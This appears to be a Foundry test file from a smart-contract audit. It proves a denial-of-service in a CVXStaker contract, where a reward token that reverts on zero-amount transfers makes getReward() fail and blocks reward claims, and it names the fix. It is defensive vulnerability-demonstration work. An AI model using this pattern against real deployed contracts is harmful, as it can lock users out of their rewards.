// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

/**
 * @title CVXStaker Zero-Amount Transfer Denial-of-Service PoC
 * @notice This PoC demonstrates how a reward token that reverts on zero-amount
 *         transfers bricks the `CVXStaker.getReward()` function.  If *any* of the
 *         configured reward tokens reverts on `transfer(…, 0)`, the whole call
 *         reverts – preventing the operator from claiming *any* rewards and
 *         effectively DoSing the contract.
 *
 *         The exploit proceeds as follows:
 *         1.  Deploy a malicious / non-standard ERC-20 that reverts on
 *             `transfer` when `amount == 0` (this pattern exists in production –
 *             see the WeirdERC20 list referenced in the audit report).
 *         2.  Configure `CVXStaker.rewardTokens` so that the first (and only)
 *             reward token is the reverting token.
 *         3.  Make sure the staker holds *zero* balance of that token (the most
 *             common state when no rewards were distributed yet).
 *         4.  Call `getReward(false)`.  The internal loop attempts to
 *             `safeTransfer(rewardsRecipient, 0)`, the token reverts, and the
 *             entire transaction bubbles up – blocking reward claims
 *             indefinitely.
 *
 *         A correct fix would be to skip transfers when `balance == 0`.
 */

import "forge-std/Test.sol";
import "@openzeppelin-contracts/token/ERC20/ERC20.sol";
import "@openzeppelin-contracts/access/Ownable.sol";

import {CVXStaker} from "../../src/CVXStaker.sol";
import {ICVXBooster} from "../../src/interfaces/ICVXBooster.sol";

/*//////////////////////////////////////////////////////////////
                            Mocks
//////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC-20 implementation that REVERTS on zero-amount transfers.
contract RevertingERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }

    /*//////////////////////////////////////////////////////////////
                                Hooks
    //////////////////////////////////////////////////////////////*/

    // override internal _transfer to inject revert-on-zero behaviour
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        if (amount == 0) {
            revert("ZERO_TRANSFER_NOT_ALLOWED");
        }
        super._transfer(from, to, amount);
    }
}

/// @dev Very small stub that fulfils the single call `CVXStaker` makes in this PoC.
contract MockRewardPool {
    function getReward(address /*_account*/, bool /*_claimExtras*/) external returns (bool) {
        // simply pretend rewards were claimed successfully
        return true;
    }

    // the following functions are declared to satisfy the interface compiler-wise
    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    function earned(address) external pure returns (uint256) {
        return 0;
    }

    function withdrawAndUnwrap(uint256, bool) external pure returns (bool) {
        return true;
    }

    function withdrawAllAndUnwrap(bool) external pure {}
}

/// @dev Minimal stub for the Booster – its functionality is irrelevant for this PoC.
contract MockBooster {
    struct PoolInfo {
        address lptoken;
        address token;
        address gauge;
        address crvRewards;
        address stash;
        bool shutdown;
    }

    function poolInfo(uint256) external pure returns (PoolInfo memory p) {
        // return default (shutdown = false) so that CVXStaker thinks pool is active
        return p;
    }
}

/*//////////////////////////////////////////////////////////////
                          Exploit Test
//////////////////////////////////////////////////////////////*/

contract ExploitTest is Test {
    CVXStaker internal staker;
    RevertingERC20 internal rewardToken;
    ERC20 internal clpToken;
    address internal recipient = address(0xBEEF);

    function setUp() public {
        // 1. Deploy tokens and mocks
        rewardToken = new RevertingERC20("RevertToken", "RVT");
        clpToken = new RevertingERC20("CLP", "CLP"); // simple mintable ERC-20 to satisfy constructor

        MockBooster booster = new MockBooster();
        MockRewardPool rewardPool = new MockRewardPool();

        // 2. Deploy CVXStaker with the reverting token as the sole reward token
        address[] memory rewardTokens = new address[](1);
        rewardTokens[0] = address(rewardToken);
        staker = new CVXStaker(address(this), IERC20(address(clpToken)), ICVXBooster(address(booster)), rewardTokens);

        // 3. Configure pool info and recipient (owner-only actions)
        staker.setCvxPoolInfo(0, address(clpToken), address(rewardPool));
        staker.setRewardsRecipient(recipient);

        // NOTE: we intentionally do *not* mint RVT tokens to the staker so that
        //       its balance stays at zero – the problematic scenario.
    }

    function test_getReward_RevertsDueToZeroAmountTransfer() public {
        // Expect the entire transaction to revert because the reward token
        // reverts on zero-amount transfers.
        vm.expectRevert("ZERO_TRANSFER_NOT_ALLOWED");
        staker.getReward(false);
    }
}
